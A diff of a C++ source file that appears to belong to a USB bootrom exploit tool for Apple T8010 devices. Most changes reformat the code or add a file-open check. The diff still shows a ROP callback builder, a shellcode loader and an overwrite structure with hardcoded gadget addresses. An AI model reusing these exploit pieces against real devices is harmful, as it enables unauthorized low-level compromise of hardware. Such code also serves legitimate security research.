@@ -2,16 +2,14 @@
 #include <fcntl.h>
 #include <fstream>
 #include <iostream>
+#include <iterator>
 #include <stdio.h>
 #include <vector>
-#include <iterator>
-
-#include <unistd.h>
 
 #ifdef WIN32
 #include <windows.h>
 #elif _POSIX_C_SOURCE >= 199309L
-#include <time.h>   // for nanosleep
+#include <time.h> // for nanosleep
 #else
 #include <unistd.h> // for usleep
 #endif
@@ -50,18 +48,17 @@ typedef struct _Callback {
 
 } Callback;
 
-
 void sleep_ms(int milliseconds) // cross-platform sleep function
 {
 #ifdef WIN32
-    Sleep(milliseconds);
+  Sleep(milliseconds);
 #elif _POSIX_C_SOURCE >= 199309L
-    struct timespec ts;
-    ts.tv_sec = milliseconds / 1000;
-    ts.tv_nsec = (milliseconds % 1000) * 1000000;
-    nanosleep(&ts, NULL);
+  struct timespec ts;
+  ts.tv_sec = milliseconds / 1000;
+  ts.tv_nsec = (milliseconds % 1000) * 1000000;
+  nanosleep(&ts, NULL);
 #else
-    usleep(milliseconds * 1000);
+  usleep(milliseconds * 1000);
 #endif
 }
 
@@ -100,7 +97,8 @@ vector<uint8_t> usb_rop_callbacks(uint64_t address, uint64_t func_gadget,
   }
 
   vector<uint8_t> dataOut;
-  append<uint8_t>(dataOut, (uint8_t *)data.data(), data.size() * sizeof(uint64_t));
+  append<uint8_t>(dataOut, (uint8_t *)data.data(),
+                  data.size() * sizeof(uint64_t));
 
   return dataOut;
 }
@@ -141,6 +139,10 @@ vector<uint8_t> prepare_shellcode(std::string name,
   // Read file
   string filename = "bin/" + name + ".bin";
   ifstream f(filename, ios::binary | ios::in);
+  if (f.is_open() == false) {
+    cout << "[!] Could not open binary file: '" << filename << "'\n";
+    exit(0);
+  }
   f.unsetf(std::ios::skipws);
   std::streampos fileSize;
   f.seekg(0, std::ios::end);
@@ -292,16 +294,16 @@ vector<uint8_t> getT8010Shellcode() {
 }
 
 #pragma pack(1)
-  typedef struct alignas(1) {
-    uint8_t temp0[0x580] = {0};
-    uint8_t temp1[32] = {0};
-    uint64_t t8010_nop_gadget0 = 0x10000CC6C;
-    uint64_t Offset = 0x1800B0800;
-    uint8_t temp[16 + 32] = {0};
-    uint64_t t8010_nop_gadget1 = 0x10000CC6C;
-    uint64_t Offset2 = 0x1800B0800;
-    uint32_t End = 0xbeefbeef;
-  } t8010_overwrite __attribute__ ((aligned (1)));;
+typedef struct alignas(1) {
+  uint8_t temp0[0x580] = {0};
+  uint8_t temp1[32] = {0};
+  uint64_t t8010_nop_gadget0 = 0x10000CC6C;
+  uint64_t Offset = 0x1800B0800;
+  uint8_t temp[16 + 32] = {0};
+  uint64_t t8010_nop_gadget1 = 0x10000CC6C;
+  uint64_t Offset2 = 0x1800B0800;
+  uint32_t End = 0xbeefbeef;
+} t8010_overwrite;
 
 int main(int argc, char *argv[]) {
   // Create device config
